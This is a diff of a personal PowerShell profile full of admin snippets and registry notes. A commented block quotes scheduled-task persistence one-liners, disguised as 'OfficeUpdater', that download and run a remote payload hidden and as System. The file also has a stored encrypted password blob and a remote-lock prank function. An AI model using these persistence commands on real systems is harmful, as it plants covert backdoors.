@@ -1,18 +1,78 @@
 <#
-HKEY_CURRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ Policies \ comdlg32 \ Placesbar
+
+https://github.com/PowerShell/platyPS
+Install-Module -Name platyPS -Scope CurrentUser
+Import-Module platyPS
+
+
+Invoke-WebRequest fails disabled  
+DisableFirstRunCustomize DWORD value greater than 0 under one of these keys:
+    "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Internet Explorer\Main",
+    "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Main",
+    "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main",
+    "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main"
+Get-ItemProperty "HKcu:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
+Get-ItemProperty "HKlm:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
+Get-ItemProperty "HKCU:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
+Get-ItemProperty "HKlm:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
+
+Get-ItemProperty "HKcu:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
+Get-ItemProperty "HKlm:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
+Get-ItemProperty "HKCU:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
+Get-ItemProperty "HKlm:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize
+
+Set-ItemProperty "HKcu:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize -value 1 
+Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize -value 1 
+Set-ItemProperty "HKcu:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize -value 1 
+Set-ItemProperty "HKLM:\Software\Microsoft\Internet Explorer\Main" -name DisableFirstRunCustomize -value 1 
+
+Following work in reg add:
+reg add "HKLM\Software\Policies\Microsoft\Internet Explorer\Main" /v DisableFirstRunCustomize /d 1 /f /t reg_dword
+reg add "HKcu\Software\Microsoft\Internet Explorer\Main"          /v DisableFirstRunCustomize /d 1 /f /t reg_dword
+
+reg query "HKLM\SOFTWARE\Microsoft\Internet Explorer\SearchURL" /s
+req query "HKCU\SOFTWARE\Microsoft\Internet Explorer\SearchURL" /s
+Internet Explorer Atos proxy for Internet Explorer http://proxyconf.my-it-solutions.net/proxy-na.pac
+HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
+AutoDetect = 1 (DWord value) - enables Automatically detect....
+HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings AutoDetect 0 (DWord) -disables Automatically detect....
+
+reg query  "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoDetect
+reg query  "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i auto
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  /v AutoDetect /d 1 /f /t REG_DWORD
+reg add    "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /d http://proxyconf.my-it-solutions.net/proxy-na.pac /f /t REG_SZ
+$url = (get-itemproperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").'AutoConfigURL'
+if ($url) {
+  $url = set-itemproperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 'AutoConfigURL-Save' $url
+}
+
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  |findstr /i auto
+
+reg add    "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL-SAVE /d http://proxyconf.my-it-solutions.net/proxy-na.pac /f /t REG_SZ
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL /f 
+# Removes it correctly but doesn't seem to update explorer "checkbox"
+Setting AutoDetect to 0 OR 1 doesn't seem to matter
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  /v AutoDetect /d 0 /f /t REG_DWORD
+
+registry key "internet explorer" "local area connection" "use automatic configuration script"
+
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  |findstr /i auto
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"  |findstr /i auto
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\comdlg32\Placesbar
 http://www.howtogeek.com/97824/how-to-customize-the-file-opensave-dialog-box-in-windows/
 
-Subst K: C:\\Users\\A469526\\documents\\tools
+Subst K: C:\Users\A469526\documents\tools
 https://code.google.com/p/psubst/#Inconstancy
 
 REGEDIT4
-[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices] 
-"Z:"="\\??\\C:\\Documents\\All Users\\Tools"
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices]
+"Z:"="\??\C:\Documents\All Users\Tools"
 
 [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
-"K Drive"="subst K: C:\\Users\\A469526\\documents\\tools
-"L Drive"="subst L: G:\\Tools"
-"M Drive"="subst M: F:\\Tools"
+"K Drive"="subst K: C:\Users\A469526\documents\tools
+"L Drive"="subst L: G:\Tools"
+"M Drive"="subst M: F:\Tools"
 #>
 
 
@@ -24,19 +84,19 @@ https://blogs.technet.microsoft.com/heyscriptingguy/2011/02/09/use-powershell-tr
 . ([scriptblock]::Create($((Get-Clipboard) -join "`n")))
 
 
-gc C:\bat\Macros.txt | 
-  % { if ($_ -match '([^=\s]+)=(.+)') { 
+gc C:\bat\Macros.txt |
+  % { if ($_ -match '([^=\s]+)=(.+)') {
   	  ($macro, $expansion) = ($matches[1], $matches[2])
-			$expansion = $expansion -creplace '\B\$T\B', '&' 
-			$expansion = $expansion -creplace '\$([\d])', '$args[$1]' 
-			$expansion = $expansion -creplace '([^)]+[)])', '$1 --%' 
-			$expansion = $expansion -creplace '\$\*', '$($args -join '' '') '       # --% ' 
+			$expansion = $expansion -creplace '\B\$T\B', '&'
+			$expansion = $expansion -creplace '\$([\d])', '$args[$1]'
+			$expansion = $expansion -creplace '([^)]+[)])', '$1 --%'
+			$expansion = $expansion -creplace '\$\*', '$($args -join '' '') '       # --% '
 #			if ($expansion -match '(.*)\$\*(.*)') {$expansion = "$($matches[1])" + ($args -join ' ') + ' --% ' + "$($matches[2])"}
-      if ($expansion -match '[{}`''"><]') { $CloseBrace = "`n}"} else { $CloseBrace = '}' } 
+      if ($expansion -match '[{}`''"><]') { $CloseBrace = "`n}"} else { $CloseBrace = '}' }
 		  "function tm_$macro { & 'cmd.exe' /c $expansion $CloseBrace"
 		}
   }
-	
+
 #	Temp-replace args and &  ==ARGSn==  ==ARGS*==
 #	Escape special chars
 #	Re-replace args
@@ -51,9 +111,9 @@ gc C:\bat\Macros.txt |
 #  ($env:path -split ';' | where {$_ -and (Test-Path $_  )}| select-object -unique
 # [System.Environment]::SetEnvironmentVariable('Path',($env:path -split ';' | where {$_ -and (Test-Path $_  )}| select-object -unique) -join ';','Machine')
 # [System.Environment]::SetEnvironmentVariable('Path','C:\ProgramData\Oracle\Java\javapath;c:\bat;c:\util;c:\unx\gnu\bin;c:\unx;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\WindowsPowerShell\v1.0\;C:\PerlStrawberry\c\bin;C:\PerlStrawberry\perl\site\bin;C:\PerlStrawberry\perl\bin;C:\Program Files (x86)\Windows Kits\8.1\Windows Performance Toolkit\;C:\Program Files\Microsoft SQL Server\110\Tools\Binn\;C:\ProgramData\chocolatey\bin;C:\Program Files\Microsoft SQL Server\120\Tools\Binn\;C:\Program Files\Microsoft SQL Server\130\Tools\Binn\;C:\Program Files (x86)\nodejs\;C:\Program Files\Git\cmd;C:\Program Files\dotnet\;C:\Users\A469526\.dnx\bin;C:\rakudo\bin;C:\rakudo\share\perl6\site\bin;C:\Users\A469526\.lein\bin;C:\Program Files (x86)\Microsoft VS Code\bin;C:\Users\A469526\AppData\Roaming\npm')
-# [System.Environment]::GetEnvironmentVariable('path','user')   'process' 'machine' 
+# [System.Environment]::GetEnvironmentVariable('path','user')   'process' 'machine'
 # (new-object System.Net.WebClient).Downloadfile("http://wordpress.org/latest.zip", "C:\Users\Brangle\Desktop\wp-latest.zip")
-# (new-object -com SAPI.SpVoice).speak("Hi Carol  it is so good to see you again")                                  
+# (new-object -com SAPI.SpVoice).speak("Hi Carol  it is so good to see you again")
 # function glc ([int []]$c=-1) {$c | % {(h)[$_].Commandline} | get-clipboard}
 function Get-PreviousCommand([int []]$c=-1) {$c | % {(h)[$_].Commandline}} # + by ID, - by position
 #  1..100 | %{ping -n 1 -w 15 11.2.7.$_ | select-string "reply from"}
@@ -61,12 +121,12 @@ function Get-PreviousCommand([int []]$c=-1) {$c | % {(h)[$_].Commandline}} # + b
 #dir | ?{$_.LastWriteTime -ge [DateTime]::Today}
 # (dir -include *.cs,*.xaml -recurse | select-string .).Count
 
-# start-transcript. Will write session to a text file. 
-# Set-PSDebug -Strict 
+# start-transcript. Will write session to a text file.
+# Set-PSDebug -Strict
 
 # Instead of Open-IE I use the built-in ii alias for Invoke-Item
 # ii "google.com"; doesn't work. How?
-# start http://google.com – orad Aug 10 '15 at 16:26 
+# start http://google.com – orad Aug 10 '15 at 16:26
 
 # write-host "Your modules are..." -ForegroundColor Red
 # Get-module -li
@@ -88,17 +148,17 @@ function Get-DiskSpace {
 
 #[Byte[]]$out=@(); 0..9 | %{$out += Get-Random -Minimum 0 -Maximum 255}; [System.IO.File]::WriteAllBytes("random",$out)
 
-The PowerShell Square Function 
+The PowerShell Square Function
 
 #It’s a straight forward pattern to get this working.
-#1.Create a function 
-#2.Add the param keyword 
-#3.Add the [Parameter(ValueFromPipeline)] attribute to the parameter 
-#4.Add a Process block for your logic (here, it’s just multiplying the parameter by itself) 
+#1.Create a function
+#2.Add the param keyword
+#3.Add the [Parameter(ValueFromPipeline)] attribute to the parameter
+#4.Add a Process block for your logic (here, it’s just multiplying the parameter by itself)
 #http://www.old.dougfinke.com/blog/index.php/2014/12/23/four-steps-to-turn-powershell-one-liners-into-pipeable-functions/
-function sqr {            
+function sqr {
 	param ([Parameter(ValueFromPipeline)] $p )
-	Process { $p * $p }            
+	Process { $p * $p }
 }
 
 # NETWORK
@@ -107,11 +167,11 @@ function sqr {
 #get-wmiobject Win32_UserAccount | ft Name,SID
 #get-wmiobject Win32_Group | ft Name,SID
 
-Set-ADAccountPassword [-Identity] <ADAccount> -AuthType Negotiate -Cred   -NewPassword  -OldPassword  -Reset -Server 
- 
-function Where-UpdatedSince{   
+Set-ADAccountPassword [-Identity] <ADAccount> -AuthType Negotiate -Cred   -NewPassword  -OldPassword  -Reset -Server
+
+function Where-UpdatedSince{
   Param([DateTime]$date=[DateTime]::Today, [switch]$before=$False)
-	Process{ if (($_.LastWriteTime -ge $date) -xor $before) { Write-Output $_ } } 
+	Process{ if (($_.LastWriteTime -ge $date) -xor $before) { Write-Output $_ } }
 };  #set-item -path alias:wus -value Where-UpdatedSince
 
 # [ValidateRange(1,10)][int]$xCon = 1; $xCon = 22
@@ -147,12 +207,12 @@ function Where-UpdatedSince{
 #    function foo($a, $b) { Write-Host $PSBoundParameters }; foo “one” “two”
 # Param ( [String[]]$files )
 #    $IsWP = [System.Management.Automation.WildcardPattern]:: ContainsWildcardCharacters($files)
-#     If ($IsWP) { $files = Get-ChildItem $files | % { $_.Name } }   
+#     If ($IsWP) { $files = Get-ChildItem $files | % { $_.Name } }
 #     http://stackoverflow.com/a/17334409/115690
 # (Get-Command path).FileVersionInfo    (Get-Item path).VersionInfo | Format-List
-# Invoke-History integer    r 23 
+# Invoke-History integer    r 23
 #  Run command from history by command substring  #commandSubstring   #child (assuming you recently ran e.g. Get-ChildItem);
-# $PROFILE | Format-List * -Force 
+# $PROFILE | Format-List * -Force
 # Test-Path $PROFILE.CurrentUserCurrentHost
 # http://stackoverflow.com/a/21200179/115690
 #   $j = Start-Job -ScriptBlock { … } if (Wait-Job $j -Timeout $seconds) { Receive-Job $j } Remove-Job -force $j
@@ -160,23 +220,23 @@ function Where-UpdatedSince{
 #     http://stackoverflow.com/a/12679208/115690
 # any > $null  $null = any  any | Out-Null  [void] (any)
 # Invoke-Expression string  iex “write-host hello”  hello
-# Get-EventLog -log system –newest 1000 | where-object {$_.eventid –eq ‘1074’} | format-table machinename, username, timegenerated –autosize 
+# Get-EventLog -log system –newest 1000 | where-object {$_.eventid –eq ‘1074’} | format-table machinename, username, timegenerated –autosize
 # Get-Hotfix -id kb2862152
-# Backup-GPO –all –path \AdminServerGPO-Backups 
-# Get-WMIobject win32_networkadapterconfiguration | where {$_.IPEnabled -eq “True”} | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table -Auto 
-# Get-WMIobject –computername WS2008-DC01 win32_networkadapterconfiguration | where {$_.IPEnabled -eq “True”}| Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table –Auto 
-# Parse a list of system names and use Get-CIMInstance – a newer CMDlet and faster than Get-WMIObject 
-#  Get-CIMInstance Win32_NetworkAdapterConfiguration -Filter ‘IPEnabled = true’ -ComputerName (Get-Content C:SERVERLIST.TXT) | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | Format-Table -AutoSize | out-file c:IPSettings.txt 
-# Get-AdDomainController -Filter * | Select hostname,isglobalcatalog | Format-table -auto 
-# Get-Content C:userlist.csv | foreach {Get-ADuser $_ | select distinguishedname,samaccountname} | export-csv –path c:newuserlist.csv 
-# What is the OS version and Service Pack level for all of my Windows systems in a certain OU? 
-#   Get-ADComputer -SearchScope Subtree -SearchBase “OU=PCs,DC=DOMAIN,DC=LAB” –Filter {OperatingSystem -Like “Windows*”} -Property * | Format-Table Name, OperatingSystem, OperatingSystemServicePack 
+# Backup-GPO –all –path \AdminServerGPO-Backups
+# Get-WMIobject win32_networkadapterconfiguration | where {$_.IPEnabled -eq “True”} | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table -Auto
+# Get-WMIobject –computername WS2008-DC01 win32_networkadapterconfiguration | where {$_.IPEnabled -eq “True”}| Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table –Auto
+# Parse a list of system names and use Get-CIMInstance – a newer CMDlet and faster than Get-WMIObject
+#  Get-CIMInstance Win32_NetworkAdapterConfiguration -Filter ‘IPEnabled = true’ -ComputerName (Get-Content C:SERVERLIST.TXT) | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | Format-Table -AutoSize | out-file c:IPSettings.txt
+# Get-AdDomainController -Filter * | Select hostname,isglobalcatalog | Format-table -auto
+# Get-Content C:userlist.csv | foreach {Get-ADuser $_ | select distinguishedname,samaccountname} | export-csv –path c:newuserlist.csv
+# What is the OS version and Service Pack level for all of my Windows systems in a certain OU?
+#   Get-ADComputer -SearchScope Subtree -SearchBase “OU=PCs,DC=DOMAIN,DC=LAB” –Filter {OperatingSystem -Like “Windows*”} -Property * | Format-Table Name, OperatingSystem, OperatingSystemServicePack
 #    •http://technet.microsoft.com/en-us/library/dn249523.aspx
 # gci –r -force | measure -sum PSIsContainer,Length -ea 0
 # ghy | select -exp commandline | ogv -outp M | iex
 #   Get-History | Select-Object -ExpandProperty commandline | Out-GridView -OutputMode Multiple | Invoke-Expression
 # $allusers= ( get-aduser -filter * -properties *)
-# $allusers| foreach { set-aduser $_ -displayname ($_.givenname + " " + $_.sn)} 
+# $allusers| foreach { set-aduser $_ -displayname ($_.givenname + " " + $_.sn)}
 # Get-Process chrome* | Select-Object processname,ID,CPU | sort CPU
 # $ListOfProcessObjects | Where-Object { $_.processname -match "chrome" } | select-object processname,VM | sort VM
 # $SystemLogs = Get-EventLog System
@@ -185,19 +245,19 @@ function Where-UpdatedSince{
 # Enter-PsSession myserver
 # Exit-PsSession
 # Invoke-Command -computername myserver1, myserver2, myserver3 {get-Process}
-# Invoke-Command -computername myserver1,myserver2,myserver3 -filepath \\scriptserver\c\scripts\script.psl
-#  N010617230237 Please save this number for future reference. 
+# Invoke-Command -computername myserver1,myserver2,myserver3 -filepath \scriptserver\c\scripts\script.psl
+#  N010617230237 Please save this number for future reference.
 # $week = (Get-Date).AddDays(-7)
 # $domain = (get-addomain).name
 # [DateTime]::Now.ToString("yyyyMMdd")     [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
 # $array = "a", "b"; write-output a b c d | select-string -pattern $array -simpleMatch
 # (get-addomain).name
-# $computer = "."; ([WMICLASS]"\\$computer\root\CIMv2:win32_process").Create("notepad.exe")
+# $computer = "."; ([WMICLASS]"\$computer\root\CIMv2:win32_process").Create("notepad.exe")
 # [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web") ; [System.Web.Security.Membership]::GeneratePassword(10,5)
 # if ($variable -is [object]) {}
 # [System.net.Dns]::GetHostEntry('APINSSWN08.txdcs.teamibm.com')
 # & { trap {continue}; [System.net.Dns]::GetHostAddresses($env:computername) }
-# psexec \\machine /s cmd /c "echo. | powershell . get-eventlog -newest 5 -logname application | select message"
+# psexec \machine /s cmd /c "echo. | powershell . get-eventlog -newest 5 -logname application | select message"
 # cls;while($true){get-date;$t = New-Object Net.Sockets.TcpClient;try {$t.connect("168.44.245.11",3389);write-host "R...
 # cls;$idxA = (get-eventlog -LogName Application -Newest 1).Index;while($true){$idxA2 = (Get-EventLog -LogName Application -newest 1).index;get-eventlog -logname Application -newest ($idxA2 - $idxA) |  sort index;$idxA = $idxA2;sleep 10}
 
@@ -205,26 +265,26 @@ function Where-UpdatedSince{
 # $p = Read-Host -AsSecureString
 # $p | ConvertFrom-SecureString
 #$UserName = "yourdomain\username"  #Elevated account name
-#$Password = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000862959a992b18048b1b3f9973ceda084000000000200000000001066000000010000200000005c5878082b7f6920ad5816116040b6e6d682b83e5a08a9030f25a9e3526a7281000000000e8000000002000020000000d54d17d6724166100acc2c15de430717984b3e53c8ae3e58e75e4bd257ef52313000000032c9fc963f2b987085b4a77b0c8f2b1180a125ccd2fedf869ff57aa86eb767ecea5d55fcb541178338419dc8b925b9d7400000004d5d40666212b0f5c13303caac80e3dd5973e9f82ca8345c51a9760f77858d95a1259a786625faa97cf1ac292eee9459cddd87446191824ec5d142f6226c3ae0" | ConvertTo-SecureString 
+#$Password = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000862959a992b18048b1b3f9973ceda084000000000200000000001066000000010000200000005c5878082b7f6920ad5816116040b6e6d682b83e5a08a9030f25a9e3526a7281000000000e8000000002000020000000d54d17d6724166100acc2c15de430717984b3e53c8ae3e58e75e4bd257ef52313000000032c9fc963f2b987085b4a77b0c8f2b1180a125ccd2fedf869ff57aa86eb767ecea5d55fcb541178338419dc8b925b9d7400000004d5d40666212b0f5c13303caac80e3dd5973e9f82ca8345c51a9760f77858d95a1259a786625faa97cf1ac292eee9459cddd87446191824ec5d142f6226c3ae0" | ConvertTo-SecureString
 #Store all of this in a format that PowerShell can use.
 #$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $P
 
 # $Epoch = New-Object -Type DateTime -ArgumentList 1970, 1, 1, 0, 0, 0, 0
-# $Epoch.AddSeconds(("1412750187")) 
+# $Epoch.AddSeconds(("1412750187"))
 # ((get-date) - $epoch).totalseconds
 # ($x=new-object xml).Load("http://rss.slashdot.org/Slashdot/slashdot");$x.RDF.item|?{$_.creator-ne"kdawson"}|fl descr*
 #     slashdot reader sans the horrible submissions by mr. kdawson. Designed to be fewer than 120 chars which allows it to be used as signature on /.
 
 # gps | select ProcessName -exp Modules -ea 0 | where {$_.modulename -match 'msvc'} | sort ModuleName | Format-Table ProcessName -GroupBy ModuleName
 
-<# 
+<#
 http://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
 #(X86) - On User Login
 schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
 #(X86) - On System Start
-schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System 
+schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
 #(X86) - On User Idle (30mins)
-schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30 
+schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 #(X64) - On User Login
 schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
 #(X64) - On System Start
@@ -232,9 +292,9 @@ schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v
 #(X64) - On User Idle (30mins)
 schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 Each of these one liners assumes a 32-bit PAYLOAD.
-#> 
+#>
 
- 
+
 function get-xpn ($text) { # Get an XPath Navigator object based on the input string containing xml
 	$rdr = [System.IO.StringReader] $text
 	$trdr = [system.io.textreader]$rdr
@@ -249,13 +309,13 @@ $snapins = @(
 	"VMware.VimAutomation.Core",
 	"NetCmdlets"
 )
-$snapins | ForEach-Object { 
+$snapins | ForEach-Object {
   if (Get-PSSnapin -Registered $_ -ErrorAction SilentlyContinue) { Add-PSSnapin $_ }
 }
 #>
 
-############################################################################## 
-## Search the PowerShell help documentation for a given Regex 
+##############################################################################
+## Search the PowerShell help documentation for a given Regex
 ##  Get-HelpMatch hashtable
 ##  Get-HelpMatch "(datetime|ticks)"
 function apropos {
@@ -263,7 +323,7 @@ function apropos {
 	$helpNames = $(get-help *)
 	foreach($helpTopic in $helpNames)	{
 	  $content = get-help -Full $helpTopic.Name | out-string
-	  if($content -match $searchWord) { 
+	  if($content -match $searchWord) {
 			 $helpTopic | select Name,Synopsis
 	  }
 	}
@@ -298,7 +358,7 @@ function average {
 
 function Get-Time { return $(get-date | foreach { $_.ToLongTimeString() } ) }
 function promptXXX {
-	# Write the time 
+	# Write the time
 	write-host "[" -noNewLine
 	write-host $(Get-Time) -foreground yellow -noNewLine
 	write-host "] " -noNewLine
@@ -309,46 +369,46 @@ function promptXXX {
 }
 
 
-function LL { # LS.MSH  Colorized LS function replacement # http://mow001.blogspot.com 
-	param ($dir = ".", $all = $false) 
-	$origFg = $host.ui.rawui.foregroundColor 
+function LL { # LS.MSH  Colorized LS function replacement # http://mow001.blogspot.com
+	param ($dir = ".", $all = $false)
+	$origFg = $host.ui.rawui.foregroundColor
 	if ( $all ) { $toList = ls -force $dir }
 	else { $toList = ls $dir }
-	foreach ($Item in $toList) { 
-		Switch ($Item.Extension) { 
-			".Exe" {$host.ui.rawui.foregroundColor = "Yellow"} 
-			".cmd" {$host.ui.rawui.foregroundColor = "Red"} 
-			".msh" {$host.ui.rawui.foregroundColor = "Red"} 
-			".vbs" {$host.ui.rawui.foregroundColor = "Red"} 
-			Default {$host.ui.rawui.foregroundColor = $origFg} 
-		} 
+	foreach ($Item in $toList) {
+		Switch ($Item.Extension) {
+			".Exe" {$host.ui.rawui.foregroundColor = "Yellow"}
+			".cmd" {$host.ui.rawui.foregroundColor = "Red"}
+			".msh" {$host.ui.rawui.foregroundColor = "Red"}
+			".vbs" {$host.ui.rawui.foregroundColor = "Red"}
+			Default {$host.ui.rawui.foregroundColor = $origFg}
+		}
 		if ($item.Mode.StartsWith("d")) {$host.ui.rawui.foregroundColor = "Green"}
-		$item 
-	}  
-	$host.ui.rawui.foregroundColor = $origFg 
+		$item
+	}
+	$host.ui.rawui.foregroundColor = $origFg
 }
 
 function lla { param ($dir=".") ll $dir $true}
 function la { ls -force }
 
 # behave like a grep command but work on objects, used to be still be allowed to use grep
-filter match  ($reg) { if ($_.tostring() -match $reg) { $_ } } 
+filter match  ($reg) { if ($_.tostring() -match $reg) { $_ } }
 # behave like a grep -v command but work on objects
-filter exclude($reg) { if (-not ($_.tostring() -match $reg)) { $_ } } 
+filter exclude($reg) { if (-not ($_.tostring() -match $reg)) { $_ } }
 filter like  ($glob) { if ($_.toString() -like $glob) { $_ } }  # behave like match but use only -like
 filter unlike($glob) { if (-not ($_.tostring() -like $glob)) { $_ } }
 ############################################################
 
 ### Load function / filter definition library
 Get-ChildItem scripts:\lib-*.ps1 | % { . $_ write-host "Loading library file:`t$($_.name)" }
-		
+
 #   http://stackoverflow.com/questions/138144/what-s-in-your-powershell-profile-ps1-file
 
 <#
 # 32-bit only
 # Exposes the environment vars in a batch and sets them in this PS session
 function Get-Batchfile($file) {
-	$theCmd = "`"$file`" & set" 
+	$theCmd = "`"$file`" & set"
 	cmd /c $theCmd | Foreach-Object {
 		$thePath, $theValue = $_.split('=')
 		Set-Item -path env:$thePath -value $theValue
@@ -373,9 +433,9 @@ function VsVars32($version = "9.0") {
 
 
 #==============================================================================
-# Jared Parsons PowerShell Profile (jaredp@rantpack.org) 
+# Jared Parsons PowerShell Profile (jaredp@rantpack.org)
 $global:Jsh = new-object psobject  # Common Variables Start
-$Jsh | add-member NoteProperty "ScriptPath" $(split-path -parent $MyInvocation.MyCommand.Definition) 
+$Jsh | add-member NoteProperty "ScriptPath" $(split-path -parent $MyInvocation.MyCommand.Definition)
 $Jsh | add-member NoteProperty "ConfigPath" $(split-path -parent $Jsh.ScriptPath)
 $Jsh | add-member NoteProperty "UtilsRawPath" $(join-path $Jsh.ConfigPath "Utils")
 $Jsh | add-member NoteProperty "UtilsPath" $(join-path $Jsh.UtilsRawPath $env:PROCESSOR_ARCHITECTURE)
@@ -386,7 +446,7 @@ function Jsh.Load-Snapin([string]$name) { # Load snapin's if they are available
 	$list = @( get-pssnapin | ? { $_.Name -eq $name })
 	if ( $list.Length -gt 0 ) { return; }
 	$snapin = get-pssnapin -registered | ? { $_.Name -eq $name }
-	if ( $snapin -ne $null ) { 			add-pssnapin $name 	} 
+	if ( $snapin -ne $null ) { 			add-pssnapin $name 	}
 }
 #==============================================================================
 
@@ -410,18 +470,18 @@ function Open-IE ($url) {    # Open Internet Explorer given the url.
 
 
 #==============================================================================
-# Christopher Douglas 
+# Christopher Douglas
 function Explore {      # explorer command
-  param (  
+  param (
 		[Parameter(Position=0, ValueFromPipeline=$true, Mandatory=$true, HelpMessage="This is the path to explore...")]
-		  [ValidateNotNullOrEmpty()] [string] $Target 
+		  [ValidateNotNullOrEmpty()] [string] $Target
 	)
 	$exploriation = New-Object -ComObject shell.application
 	$exploriation.Explore($Target)
 }
 
 Function RDP {
-  param (  
+  param (
 		[Parameter(Position=0, ValueFromPipeline=$true, Mandatory=$true, HelpMessage="Server Friendly name")]
 		  [ValidateNotNullOrEmpty()] [string]$server
 	)
@@ -438,23 +498,23 @@ function New-Explorer { #CLI prompt for password & restart explorer as $UserName
 }
 
 Function Lock-RemoteWorkstationXXXXXX {   This is just because its funny.  PRANK
-	param( 
-		$Computername, 
-		$Credential 
-	) 
-	if (!(get-module taskscheduler)) {Import-Module TaskScheduler} 
-	New-task -ComputerName $Computername -credential:$Credential |  
-	Add-TaskTrigger -In (New-TimeSpan -Seconds 30) | 
-	Add-TaskAction -Script {  
-		$signature = "[DllImport("user32.dll", SetLastError = true)] public static extern bool LockWorkStation();" 
-    $LockWorkStation = Add-Type -memberDefinition $signature -name "Win32LockWorkStation" -namespace Win32Functions -passthru  
-    $LockWorkStation::LockWorkStation() | Out-Null 
-  } | Register-ScheduledTask TestTask -ComputerName $Computername -credential:$Credential 
+	param(
+		$Computername,
+		$Credential
+	)
+	if (!(get-module taskscheduler)) {Import-Module TaskScheduler}
+	New-task -ComputerName $Computername -credential:$Credential |
+	Add-TaskTrigger -In (New-TimeSpan -Seconds 30) |
+	Add-TaskAction -Script {
+		$signature = "[DllImport("user32.dll", SetLastError = true)] public static extern bool LockWorkStation();"
